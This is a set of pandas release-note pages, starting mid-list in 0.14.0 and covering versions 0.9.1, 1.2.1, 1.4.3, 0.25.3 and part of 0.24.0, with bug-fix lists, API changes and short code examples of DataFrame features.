``DataFrame.boxplot`` where it failed to use the axis passed as the ``ax`` argument (:issue:`3578`)\n- Bug in the ``XlsxWriter`` and ``XlwtWriter`` implementations that resulted in datetime columns being formatted without the time (:issue:`7075`)\n  were being passed to plotting method\n- :func:`read_fwf` treats ``None`` in ``colspec`` like regular python slices. It now reads from the beginning\n  or until the end of the line when ``colspec`` contains a ``None`` (previously raised a ``TypeError``)\n- Bug in cache coherence with chained indexing and slicing; add ``_is_view`` property to ``NDFrame`` to correctly predict\n  views; mark ``is_copy`` on ``xs`` only if its an actual copy (and not a view) (:issue:`7084`)\n- Bug in DatetimeIndex creation from string ndarray with ``dayfirst=True`` (:issue:`5917`)\n- Bug in ``MultiIndex.from_arrays`` created from ``DatetimeIndex`` doesn't preserve ``freq`` and ``tz`` (:issue:`7090`)\n- Bug in ``unstack`` raises ``ValueError`` when ``MultiIndex`` contains ``PeriodIndex`` (:issue:`4342`)\n- Bug in ``boxplot`` and ``hist`` draws unnecessary axes (:issue:`6769`)\n- Regression in ``groupby.nth()`` for out-of-bounds indexers (:issue:`6621`)\n- Bug in ``quantile`` with datetime values (:issue:`6965`)\n- Bug in ``Dataframe.set_index``, ``reindex`` and ``pivot`` don't preserve ``DatetimeIndex`` and ``PeriodIndex`` attributes (:issue:`3950`, :issue:`5878`, :issue:`6631`)\n- Bug in ``MultiIndex.get_level_values`` doesn't preserve ``DatetimeIndex`` and ``PeriodIndex`` attributes (:issue:`7092`)\n- Bug in ``Groupby`` doesn't preserve ``tz`` (:issue:`3950`)\n- Bug in ``PeriodIndex`` partial string slicing (:issue:`6716`)\n- Bug in the HTML repr of a truncated Series or DataFrame not showing the class name with the ``large_repr`` set to 'info'\n  (:issue:`7105`)\n- Bug in ``DatetimeIndex`` specifying ``freq`` raises ``ValueError`` when passed value is too short (:issue:`7098`)\n- Fixed a bug with the ``info`` repr not honoring the ``display.max_info_columns`` setting (:issue:`6939`)\n- Bug ``PeriodIndex`` string slicing with out of bounds values (:issue:`5407`)\n- Fixed a memory error in the hashtable implementation/factorizer on resizing of large tables (:issue:`7157`)\n- Bug in ``isnull`` when applied to 0-dimensional object arrays (:issue:`7176`)\n- Bug in ``query``/``eval`` where global constants were not looked up correctly\n  (:issue:`7178`)\n- Bug in recognizing out-of-bounds positional list indexers with ``iloc`` and a multi-axis tuple indexer (:issue:`7189`)\n- Bug in setitem with a single value, MultiIndex and integer indices (:issue:`7190`, :issue:`7218`)\n- Bug in expressions evaluation with reversed ops, showing in series-dataframe ops (:issue:`7198`, :issue:`7192`)\n- Bug in multi-axis indexing with > 2 ndim and a MultiIndex (:issue:`7199`)\n- Fix a bug where invalid eval/query operations would blow the stack (:issue:`5198`)\n\n\n.. _whatsnew_0.14.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.13.1..v0.14.0\n\n\n.. _whatsnew_0901:\n\nVersion 0.9.1 (November 14, 2012)\n---------------------------------\n\n{{ header }}\n\n\nThis is a bug fix release from 0.9.0 and includes several new features and\nenhancements along with a large number of bug fixes. The new features include\nby-column sort order for DataFrame and Series, improved NA handling for the rank\nmethod, masking functions for DataFrame, and intraday time-series filtering for\nDataFrame.\n\nNew features\n~~~~~~~~~~~~\n\n  - ``Series.sort``, ``DataFrame.sort``, and ``DataFrame.sort_index`` can now be\n    specified in a per-column manner to support multiple sort orders (:issue:`928`)\n\n    .. code-block:: ipython\n\n       In [2]: df = pd.DataFrame(np.random.randint(0, 2, (6, 3)),\n          ...:                   columns=['A', 'B', 'C'])\n\n       In [3]: df.sort(['A', 'B'], ascending=[1, 0])\n\n       Out[3]:\n          A  B  C\n       3  0  1  1\n       4  0  1  1\n       2  0  0  1\n       0  1  0  0\n       1  1  0  0\n       5  1  0  0\n\n  - ``DataFrame.rank`` now supports additional argument values for the\n    ``na_option`` parameter so missing values can be assigned either the largest\n    or the smallest rank (:issue:`1508`, :issue:`2159`)\n\n    .. ipython:: python\n\n        df = pd.DataFrame(np.random.randn(6, 3), columns=['A', 'B', 'C'])\n\n        df.loc[2:4] = np.nan\n\n        df.rank()\n\n        df.rank(na_option='top')\n\n        df.rank(na_option='bottom')\n\n\n  - DataFrame has new ``where`` and ``mask`` methods to select values according to a\n    given boolean mask (:issue:`2109`, :issue:`2151`)\n\n        DataFrame currently supports slicing via a boolean vector the same length as the DataFrame (inside the ``[]``).\n        The returned DataFrame has the same number of columns as the original, but is sliced on its index.\n\n        .. ipython:: python\n\n            df = pd.DataFrame(np.random.randn(5, 3), columns=['A', 'B', 'C'])\n\n            df\n\n            df[df['A'] > 0]\n\n        If a DataFrame is sliced with a DataFrame based boolean condition (with the same size as the original DataFrame),\n        then a DataFrame the same size (index and columns) as the original is returned, with\n        elements that do not meet the boolean condition as ``NaN``. This is accomplished via\n        the new method ``DataFrame.where``. In addition, ``where`` takes an optional ``other`` argument for replacement.\n\n        .. ipython:: python\n\n           df[df > 0]\n\n           df.where(df > 0)\n\n           df.where(df > 0, -df)\n\n        Furthermore, ``where`` now aligns the input boolean condition (ndarray or DataFrame), such that partial selection\n        with setting is possible. This is analogous to partial setting via ``.ix`` (but on the contents rather than the axis labels)\n\n        .. ipython:: python\n\n           df2 = df.copy()\n           df2[df2[1:4] > 0] = 3\n           df2\n\n        ``DataFrame.mask`` is the inverse boolean operation of ``where``.\n\n        .. ipython:: python\n\n           df.mask(df <= 0)\n\n  - Enable referencing of Excel columns by their column names (:issue:`1936`)\n\n    .. code-block:: ipython\n\n       In [1]: xl = pd.ExcelFile('data/test.xls')\n\n       In [2]: xl.parse('Sheet1', index_col=0, parse_dates=True,\n                        parse_cols='A:D')\n\n\n  - Added option to disable pandas-style tick locators and formatters\n    using ``series.plot(x_compat=True)`` or ``pandas.plot_params['x_compat'] =\n    True`` (:issue:`2205`)\n  - Existing TimeSeries methods ``at_time`` and ``between_time`` were added to\n    DataFrame (:issue:`2149`)\n  - DataFrame.dot can now accept ndarrays (:issue:`2042`)\n  - DataFrame.drop now supports non-unique indexes (:issue:`2101`)\n  - Panel.shift now supports negative periods (:issue:`2164`)\n  - DataFrame now support unary ~ operator (:issue:`2110`)\n\nAPI changes\n~~~~~~~~~~~\n\n  - Upsampling data with a PeriodIndex will result in a higher frequency\n    TimeSeries that spans the original time window\n\n    .. code-block:: ipython\n\n       In [1]: prng = pd.period_range('2012Q1', periods=2, freq='Q')\n\n       In [2]: s = pd.Series(np.random.randn(len(prng)), prng)\n\n       In [4]: s.resample('M')\n       Out[4]:\n       2012-01   -1.471992\n       2012-02         NaN\n       2012-03         NaN\n       2012-04   -0.493593\n       2012-05         NaN\n       2012-06         NaN\n       Freq: M, dtype: float64\n\n  - Period.end_time now returns the last nanosecond in the time interval\n    (:issue:`2124`, :issue:`2125`, :issue:`1764`)\n\n    .. ipython:: python\n\n        p = pd.Period('2012')\n\n        p.end_time\n\n\n  - File parsers no longer coerce to float or bool for columns that have custom\n    converters specified (:issue:`2184`)\n\n    .. ipython:: python\n\n        import io\n\n        data = ('A,B,C\\n'\n                '00001,001,5\\n'\n                '00002,002,6')\n        pd.read_csv(io.StringIO(data), converters={'A': lambda x: x.strip()})\n\n\nSee the :ref:`full release notes\n<release>` or issue tracker\non GitHub for a complete list.\n\n\n.. _whatsnew_0.9.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.9.0..v0.9.1\n\n\n.. _whatsnew_121:\n\nWhat's new in 1.2.1 (January 20, 2021)\n--------------------------------------\n\nThese are the changes in pandas 1.2.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_121.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`~DataFrame.to_csv` that created corrupted zip files when there were more rows than ``chunksize`` (:issue:`38714`)\n- Fixed regression in :meth:`~DataFrame.to_csv` opening ``codecs.StreamReaderWriter`` in binary mode instead of in text mode (:issue:`39247`)\n- Fixed regression in :meth:`read_csv` and other read functions were the encoding error policy (``errors``) did not default to ``\"replace\"`` when no encoding was specified (:issue:`38989`)\n- Fixed regression in :func:`read_excel` with non-rawbyte file handles (:issue:`38788`)\n- Fixed regression in :meth:`DataFrame.to_stata` not removing the created file when an error occurred (:issue:`39202`)\n- Fixed regression in ``DataFrame.__setitem__`` raising ``ValueError`` when expanding :class:`DataFrame` and new column is from type ``\"0 - name\"`` (:issue:`39010`)\n- Fixed regression in setting with :meth:`DataFrame.loc`  raising ``ValueError`` when :class:`DataFrame` has unsorted :class:`MultiIndex` columns and indexer is a scalar (:issue:`38601`)\n- Fixed regression in setting with :meth:`DataFrame.loc` raising ``KeyError`` with :class:`MultiIndex` and list-like columns indexer enlarging :class:`DataFrame` (:issue:`39147`)\n- Fixed regression in :meth:`~DataFrame.groupby()` with :class:`Categorical` grouping column not showing unused categories for ``grouped.indices`` (:issue:`38642`)\n- Fixed regression in :meth:`.DataFrameGroupBy.sem` and :meth:`.SeriesGroupBy.sem` where the presence of non-numeric columns would cause an error instead of being dropped (:issue:`38774`)\n- Fixed regression in :meth:`.DataFrameGroupBy.diff` raising for ``int8`` and ``int16`` columns (:issue:`39050`)\n- Fixed regression in :meth:`DataFrame.groupby` when aggregating an ``ExtensionDType`` that could fail for non-numeric values (:issue:`38980`)\n- Fixed regression in :meth:`.Rolling.skew` and :meth:`.Rolling.kurt` modifying the object inplace (:issue:`38908`)\n- Fixed regression in :meth:`DataFrame.any` and :meth:`DataFrame.all` not returning a result for tz-aware ``datetime64`` columns (:issue:`38723`)\n- Fixed regression in :meth:`DataFrame.apply` with ``axis=1`` using str accessor in apply function (:issue:`38979`)\n- Fixed regression in :meth:`DataFrame.replace` raising ``ValueError`` when :class:`DataFrame` has dtype ``bytes`` (:issue:`38900`)\n- Fixed regression in :meth:`Series.fillna` that raised ``RecursionError`` with ``datetime64[ns, UTC]`` dtype (:issue:`38851`)\n- Fixed regression in comparisons between ``NaT`` and ``datetime.date`` objects incorrectly returning ``True`` (:issue:`39151`)\n- Fixed regression in calling NumPy :func:`~numpy.ufunc.accumulate` ufuncs on DataFrames, e.g. ``np.maximum.accumulate(df)`` (:issue:`39259`)\n- Fixed regression in repr of float-like strings of an ``object`` dtype having trailing 0's truncated after the decimal (:issue:`38708`)\n- Fixed regression that raised ``AttributeError`` with PyArrow versions [0.16.0, 1.0.0) (:issue:`38801`)\n- Fixed regression in :func:`pandas.testing.assert_frame_equal` raising ``TypeError`` with ``check_like=True`` when :class:`Index` or columns have mixed dtype (:issue:`39168`)\n\nWe have reverted a commit that resulted in several plotting related regressions in pandas 1.2.0 (:issue:`38969`, :issue:`38736`, :issue:`38865`, :issue:`38947` and :issue:`39126`).\nAs a result, bugs reported as fixed in pandas 1.2.0 related to inconsistent tick labeling in bar plots are again present (:issue:`26186` and :issue:`11465`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_121.ufunc_deprecation:\n\nCalling NumPy ufuncs on non-aligned DataFrames\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nBefore pandas 1.2.0, calling a NumPy ufunc on non-aligned DataFrames (or\nDataFrame / Series combination) would ignore the indices, only match\nthe inputs by shape, and use the index/columns of the first DataFrame for\nthe result:\n\n.. code-block:: ipython\n\n    In [1]: df1 = pd.DataFrame({\"a\": [1, 2], \"b\": [3, 4]}, index=[0, 1])\n    In [2]: df2 = pd.DataFrame({\"a\": [1, 2], \"b\": [3, 4]}, index=[1, 2])\n    In [3]: df1\n    Out[3]:\n       a  b\n    0  1  3\n    1  2  4\n    In [4]: df2\n    Out[4]:\n       a  b\n    1  1  3\n    2  2  4\n\n    In [5]: np.add(df1, df2)\n    Out[5]:\n       a  b\n    0  2  6\n    1  4  8\n\nThis contrasts with how other pandas operations work, which first align\nthe inputs:\n\n.. code-block:: ipython\n\n    In [6]: df1 + df2\n    Out[6]:\n         a    b\n    0  NaN  NaN\n    1  3.0  7.0\n    2  NaN  NaN\n\nIn pandas 1.2.0, we refactored how NumPy ufuncs are called on DataFrames, and\nthis started to align the inputs first (:issue:`39184`), as happens in other\npandas operations and as it happens for ufuncs called on Series objects.\n\nFor pandas 1.2.1, we restored the previous behaviour to avoid a breaking\nchange, but the above example of ``np.add(df1, df2)`` with non-aligned inputs\nwill now to raise a warning, and a future pandas 2.0 release will start\naligning the inputs first (:issue:`39184`). Calling a NumPy ufunc on Series\nobjects (eg ``np.add(s1, s2)``) already aligns and continues to do so.\n\nTo avoid the warning and keep the current behaviour of ignoring the indices,\nconvert one of the arguments to a NumPy array:\n\n.. code-block:: ipython\n\n    In [7]: np.add(df1, np.asarray(df2))\n    Out[7]:\n       a  b\n    0  2  6\n    1  4  8\n\nTo obtain the future behaviour and silence the warning, you can align manually\nbefore passing the arguments to the ufunc:\n\n.. code-block:: ipython\n\n    In [8]: df1, df2 = df1.align(df2)\n    In [9]: np.add(df1, df2)\n    Out[9]:\n         a    b\n    0  NaN  NaN\n    1  3.0  7.0\n    2  NaN  NaN\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_121.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in :meth:`read_csv` with ``float_precision=\"high\"`` caused segfault or wrong parsing of long exponent strings. This resulted in a regression in some cases as the default for ``float_precision`` was changed in pandas 1.2.0 (:issue:`38753`)\n- Bug in :func:`read_csv` not closing an opened file handle when a ``csv.Error`` or ``UnicodeDecodeError`` occurred while initializing (:issue:`39024`)\n- Bug in :func:`pandas.testing.assert_index_equal` raising ``TypeError`` with ``check_order=False`` when :class:`Index` has mixed dtype (:issue:`39168`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_121.other:\n\nOther\n~~~~~\n\n- The deprecated attributes ``_AXIS_NAMES`` and ``_AXIS_NUMBERS`` of :class:`DataFrame` and :class:`Series` will no longer show up in ``dir`` or ``inspect.getmembers`` calls (:issue:`38740`)\n- Bumped minimum fastparquet version to 0.4.0 to avoid ``AttributeError`` from numba (:issue:`38344`)\n- Bumped minimum pymysql version to 0.8.1 to avoid test failures (:issue:`38344`)\n- Fixed build failure on MacOS 11 in Python 3.9.1 (:issue:`38766`)\n- Added reference to backwards incompatible ``check_freq`` arg of :func:`testing.assert_frame_equal` and :func:`testing.assert_series_equal` in :ref:`pandas 1.1.0 what's new <whatsnew_110.api_breaking.testing.check_freq>` (:issue:`34050`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_121.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.2.0..v1.2.1\n\n\n.. _whatsnew_143:\n\nWhat's new in 1.4.3 (June 23, 2022)\n-----------------------------------\n\nThese are the changes in pandas 1.4.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_143.concat:\n\nBehavior of ``concat`` with empty or all-NA DataFrame columns\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe behavior change in version 1.4.0 to stop ignoring the data type\nof empty or all-NA columns with float or object dtype in :func:`concat`\n(:ref:`whatsnew_140.notable_bug_fixes.concat_with_empty_or_all_na`) has been\nreverted (:issue:`45637`).\n\n\n.. _whatsnew_143.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`DataFrame.replace` when the replacement value was explicitly ``None`` when passed in a dictionary to ``to_replace`` also casting other columns to object dtype even when there were no values to replace (:issue:`46634`)\n- Fixed regression in :meth:`DataFrame.to_csv` raising error when :class:`DataFrame` contains extension dtype categorical column (:issue:`46297`, :issue:`46812`)\n- Fixed regression in representation of ``dtypes`` attribute of :class:`MultiIndex` (:issue:`46900`)\n- Fixed regression when setting values with :meth:`DataFrame.loc` updating :class:`RangeIndex` when index was set as new column and column was updated afterwards (:issue:`47128`)\n- Fixed regression in :meth:`DataFrame.fillna` and :meth:`DataFrame.update` creating a copy when updating inplace (:issue:`47188`)\n- Fixed regression in :meth:`DataFrame.nsmallest` led to wrong results when the sorting column has ``np.nan`` values (:issue:`46589`)\n- Fixed regression in :func:`read_fwf` raising ``ValueError`` when ``widths`` was specified with ``usecols`` (:issue:`46580`)\n- Fixed regression in :func:`concat` not sorting columns for mixed column names (:issue:`47127`)\n- Fixed regression in :meth:`.Groupby.transform` and :meth:`.Groupby.agg` failing with ``engine=\"numba\"`` when the index was a :class:`MultiIndex` (:issue:`46867`)\n- Fixed regression in ``NaN`` comparison for :class:`Index` operations where the same object was compared (:issue:`47105`)\n- Fixed regression is :meth:`.Styler.to_latex` and :meth:`.Styler.to_html` where ``buf`` failed in combination with ``encoding`` (:issue:`47053`)\n- Fixed regression in :func:`read_csv` with ``index_col=False`` identifying first row as index names when ``header=None`` (:issue:`46955`)\n- Fixed regression in :meth:`.DataFrameGroupBy.agg` when used with list-likes or dict-likes and ``axis=1`` that would give incorrect results; now raises ``NotImplementedError`` (:issue:`46995`)\n- Fixed regression in :meth:`DataFrame.resample` and :meth:`DataFrame.rolling` when used with list-likes or dict-likes and ``axis=1`` that would raise an unintuitive error message; now raises ``NotImplementedError`` (:issue:`46904`)\n- Fixed regression in :func:`testing.assert_index_equal` when ``check_order=False`` and :class:`Index` has extension or object dtype (:issue:`47207`)\n- Fixed regression in :func:`read_excel` returning ints as floats on certain input sheets (:issue:`46988`)\n- Fixed regression in :meth:`DataFrame.shift` when ``axis`` is ``columns`` and ``fill_value`` is absent, ``freq`` is ignored (:issue:`47039`)\n- Fixed regression in :meth:`DataFrame.to_json` causing a segmentation violation when :class:`DataFrame` is created with an ``index`` parameter of the type :class:`PeriodIndex` (:issue:`46683`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_143.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :func:`pandas.eval`, :meth:`DataFrame.eval` and :meth:`DataFrame.query` where passing empty ``local_dict`` or ``global_dict`` was treated as passing ``None`` (:issue:`47084`)\n- Most I/O methods no longer suppress ``OSError`` and ``ValueError`` when closing file handles (:issue:`47136`)\n- Improving error message raised by :meth:`DataFrame.from_dict` when passing an invalid ``orient`` parameter (:issue:`47450`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_143.other:\n\nOther\n~~~~~\n- The minimum version of Cython needed to compile pandas is now ``0.29.30`` (:issue:`41935`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_143.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.4.2..v1.4.3\n\n\n.. _whatsnew_0253:\n\nWhat's new in 0.25.3 (October 31, 2019)\n---------------------------------------\n\nThese are the changes in pandas 0.25.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n.. _whatsnew_0253.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nGroupBy/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Bug in :meth:`DataFrameGroupBy.quantile` where NA values in the grouping could cause segfaults or incorrect results (:issue:`28882`)\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.25.2..v0.25.3\n\n\n.. _whatsnew_0240:\n\nWhat's new in 0.24.0 (January 25, 2019)\n---------------------------------------\n\n.. warning::\n\n   The 0.24.x series of releases will be the last to support Python 2. Future feature\n   releases will support Python 3 only. See `Dropping Python 2.7 <https://pandas.pydata.org/pandas-docs/version/0.24/install.html#install-dropping-27>`_ for more\n   details.\n\n{{ header }}\n\nThis is a major release from 0.23.4 and includes a number of API changes, new\nfeatures, enhancements, and performance improvements along with a large number\nof bug fixes.\n\nHighlights include:\n\n* :ref:`Optional Integer NA Support <whatsnew_0240.enhancements.intna>`\n* :ref:`New APIs for accessing the array backing a Series or Index <whatsnew_0240.values_api>`\n* :ref:`A new top-level method for creating arrays <whatsnew_0240.enhancements.array>`\n* :ref:`Store Interval and Period data in a Series or DataFrame <whatsnew_0240.enhancements.interval>`\n* :ref:`Support for joining on two MultiIndexes <whatsnew_0240.enhancements.join_with_two_multiindexes>`\n\n\nCheck the :ref:`API Changes <whatsnew_0240.api_breaking>` and :ref:`deprecations <whatsnew_0240.deprecations>` before updating.\n\nThese are the changes in pandas 0.24.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_0240.enhancements.intna:\n\nOptional integer NA support\n^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas has gained the ability to hold integer dtypes with missing values. This long requested feature is enabled through the use of :ref:`extension types <extending.extension-types>`.\n\n.. note::\n\n   IntegerArray is currently experimental. Its API or implementation may\n   change without warning.\n\nWe can construct a ``Series`` with the specified dtype. The dtype string ``Int64`` is a pandas ``ExtensionDtype``. Specifying a list or array using the traditional missing value\nmarker of ``np.nan`` will infer to integer dtype. The display of the ``Series`` will also use the ``NaN`` to indicate missing values in string outputs. (:issue:`20700`, :issue:`20747`, :issue:`22441`, :issue:`21789`, :issue:`22346`)\n\n.. ipython:: python\n\n   s = pd.Series([1, 2, np.nan], dtype='Int64')\n   s\n\n\nOperations on these dtypes will propagate ``NaN`` as other pandas operations.\n\n.. ipython:: python\n\n    arithmetic\n   s + 1\n\n    comparison\n   s == 1\n\n    indexing\n   s.iloc[1:3]\n\n    operate with other dtypes\n   s + s.iloc[1:3].astype('Int8')\n\n    coerce when needed\n   s + 0.01\n\nThese dtypes can operate as part of a ``DataFrame``.\n\n.. ipython:: python\n\n   df = pd.DataFrame({'A': s, 'B': [1, 1, 3], 'C': list('aab')})\n   df\n   df.dtypes\n\n\nThese dtypes can be merged, reshaped, and casted.\n\n.. ipython:: python\n\n   pd.concat([df[['A']], df[['B', 'C']]], axis=1).dtypes\n   df['A'].astype(float)\n\nReduction and groupby operations such as ``sum`` work.\n\n.. ipython:: python\n\n   df.sum()\n   df.groupby('B').A.sum()\n\n.. warning::\n\n   The Integer NA support currently uses the capitalized dtype version, e.g. ``Int8`` as compared to the traditional ``int8``. This may be changed at a future date.\n\nSee :ref:`integer_na` for more.\n\n\n.. _whatsnew_0240.values_api:\n\nAccessing the values in a Series or Index\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:attr:`Series.array` and :attr:`Index.array` have been added for extracting the array backing a\n``Series`` or ``Index``. (:issue:`19954`, :issue:`23623`)\n\n.. ipython:: python\n\n   idx = pd.period_range('2000', periods=4)\n   idx.array\n   pd.Series(idx).array\n\nHistorically, this would have been done with ``series.values``, but with\n``.values`` it was unclear whether the returned value would be the actual array,\nsome transformation of it, or one of pandas custom arrays (like\n``Categorical``). For example, with :class:`PeriodIndex`, ``.values`` generates\na new ndarray of period objects each time.\n\n.. ipython:: python\n\n   idx.values\n   id(idx.values)\n   id(idx.values)\n\nIf you need an actual NumPy array, use :meth:`Series.to_numpy` or :meth:`Index.to_numpy`.\n\n.. ipython:: python\n\n   idx.to_numpy()\n   pd.Series(idx).to_numpy()\n\nFor Series and Indexes backed by normal NumPy arrays, :attr:`Series.array` will return a\nnew :class:`arrays.PandasArray`, which is a thin (no-copy) wrapper around a\n:class:`numpy.ndarray`. :class:`~arrays.PandasArray` isn't especially useful on its own,\nbut it does provide the same interface as any extension array defined in pandas or by\na third-party library.\n\n.. ipython:: python\n\n   ser = pd.Series([1, 2, 3])\n   ser.array\n   ser.to_numpy()\n\nWe haven't removed or deprecated :attr:`Series.values` or :attr:`DataFrame.values`, but we\nhighly recommend and using ``.array`` or ``.to_numpy()`` instead.\n\nSee :ref:`Dtypes <basics.dtypes>` and :ref:`Attributes and Underlying Data <basics.attrs>` for more.\n\n\n.. _whatsnew_0240.enhancements.array:\n\n``pandas.array``: a new top-level method for creating arrays\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nA new top-level method :func:`array` has been added for creating 1-dimensional arrays (:issue:`22860`).\nThis can be used to create any :ref:`extension array <extending.extension-types>`, including\nextension arrays registered by `3rd party libraries <https://pandas.pydata.org/community/ecosystem.html>`_.\nSee the :ref:`dtypes docs <basics.dtypes>` for more on extension arrays.\n\n.. ipython:: python\n\n   pd.array([1, 2, np.nan], dtype='Int64')\n   pd.array(['a', 'b', 'c'], dtype='category')\n\nPassing data for which there isn't dedicated extension type (e.g. float, integer, etc.)\nwill return a new :class:`arrays.PandasArray`, which is just a thin (no-copy)\nwrapper around a :class:`numpy.ndarray` that satisfies the pandas extension array interface.\n\n.. ipython:: python\n\n   pd.array([1, 2, 3])\n\nOn their own, a :class:`~arrays.PandasArray` isn't a very useful object.\nBut if you need write low-level code that works generically for any\n:class:`~pandas.api.extensions.ExtensionArray`, :class:`~arrays.PandasArray`\nsatisfies that need.\n\nNotice that by default, if no ``dtype`` is specified, the dtype of the returned\narray is inferred from the data. In particular, note that the first example of\n``[1, 2, np.nan]`` would have returned a floating-point array, since ``NaN``\nis a float.\n\n.. ipython:: python\n\n   pd.array([1, 2, np.nan])\n\n\n.. _whatsnew_0240.enhancements.interval:\n\nStoring Interval and Period data in Series and DataFrame\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`Interval` and :class:`Period` data may now be stored in a :class:`Series` or :class:`DataFrame`, in addition to an\n:class:`IntervalIndex` and :class:`PeriodIndex` like previously (:issue:`19453`, :issue:`22862`).\n\n.. ipython:: python\n\n   ser = pd.Series(pd.interval_range(0, 5))\n   ser\n   ser.dtype\n\nFor periods:\n\n.. ipython:: python\n\n   pser = pd.Series(pd.period_range(\"2000\", freq=\"D\", periods=5))\n   pser\n   pser.dtype\n\nPreviously, these would be cast to a NumPy array with object dtype. In general,\nthis should result in better performance when storing an array of intervals or periods\nin a :class:`Series` or column of a :class:`DataFrame`.\n\nUse :attr:`Series.array` to extract the underlying array of intervals or periods\nfrom the ``Series``:\n\n.. ipython:: python\n\n   ser.array\n   pser.array\n\nThese return an instance of :class:`arrays.IntervalArray` or :class:`arrays.PeriodArray`,\nthe new extension arrays that back interval and period data.\n\n.. warning::\n\n   For backwards compatibility, :attr:`Series.values` continues to return\n   a NumPy array of objects for Interval and Period data. We recommend\n   using :attr:`Series.array` when you need the array of data stored in the\n   ``Series``, and :meth:`Series.to_numpy` when you know you need a NumPy array.\n\n   See :ref:`Dtypes <basics.dtypes>` and :ref:`Attributes and Underlying Data <basics.attrs>`\n   for more.\n\n\n.. _whatsnew_0240.enhancements.join_with_two_multiindexes:\n\nJoining with two multi-indexes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`DataFrame.merge` and :func:`DataFrame.join` can now be used to join multi-indexed ``Dataframe`` instances on the overlapping index levels (:issue:`6360`)\n\nSee the :ref:`Merge, join, and concatenate\n<merging.Join_with_two_multi_indexes>` documentation section.\n\n.. ipython:: python\n\n   index_left = pd.MultiIndex.from_tuples([('K0', 'X0'), ('K0', 'X1'),\n                                          ('K1', 'X2')],\n                                          names=['key', 'X'])\n\n   left = pd.DataFrame({'A': ['A0', 'A1', 'A2'],\n                        'B': ['B0', 'B1', 'B2']}, index=index_left)\n\n   index_right = pd.MultiIndex.from_tuples([('K0', 'Y0'), ('K1', 'Y1'),\n                                           ('K2', 'Y2'), ('K2', 'Y3')],\n                                           names=['key', 'Y'])\n\n   right = pd.DataFrame({'C': ['C0', 'C1', 'C2', 'C3'],\n                         'D': ['D0', 'D1', 'D2', 'D3']}, index=index_right)\n\n   left.join(right)\n\nFor earlier versions this can be done using the following.\n\n.. ipython:: python\n\n   pd.merge(left.reset_index(), right.reset_index(),\n            on=['key'], how='inner').set_index(['key', 'X', 'Y'])\n\n.. _whatsnew_0240.enhancements.read_html:\n\nFunction ``read_html`` enhancements\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`read_html` previously ignored ``colspan`` and ``rowspan`` attributes.\nNow it understands them, treating them as sequences of cells with the same\nvalue. (:issue:`17054`)\n\n.. ipython:: python\n\n    from io import StringIO\n    result = pd.read_html(StringIO(\"\"\"\n      <table>\n        <thead>\n          <tr>\n            <th>A</th><th>B</th><th>C</th>\n          </tr>\n        </thead>\n        <tbody>\n          <tr>\n            <td colspan=\"2\">1</td><td>2</td>\n          </tr>\n        </tbody>\n      </table>\"\"\"))\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [13]: result\n    Out [13]:\n    [   A  B   C\n     0  1  2 NaN]\n\n*New behavior*:\n\n.. ipython:: python\n\n    result\n\n\nNew ``Styler.pipe()`` method\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nThe :class:`~pandas.io.formats.style.Styler` class has gained a\n:meth:`~pandas.io.formats.style.Styler.pipe` method.  This provides a\nconvenient way to apply users' predefined styling functions, and can help reduce\n\"boilerplate\" when using DataFrame styling functionality repeatedly within a notebook. (:issue:`23229`)\n\n.. ipython:: python\n\n    df = pd.DataFrame({'N': [1250, 1500, 1750], 'X': [0.25, 0.35, 0.50]})\n\n    def format_and_align(styler):\n        return (styler.format({'N': '{:,}', 'X': '{:.1%}'})\n                      .set_properties(**{'text-align': 'right'}))\n\n    df.style.pipe(format_and_align).set_caption('Summary of results.')\n\nSimilar methods already exist for other classes in pandas, including :meth:`DataFrame.pipe`,\n:meth:`GroupBy.pipe() <.GroupBy.pipe>`, and :meth:`Resampler.pipe() <.Resampler.pipe>`.\n\n.. _whatsnew_0240.enhancements.rename_axis:\n\nRenaming names in a MultiIndex\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`DataFrame.rename_axis` now supports ``index`` and ``columns`` arguments\nand :func:`Series.rename_axis` supports ``index`` argument (:issue:`19978`).\n\nThis change 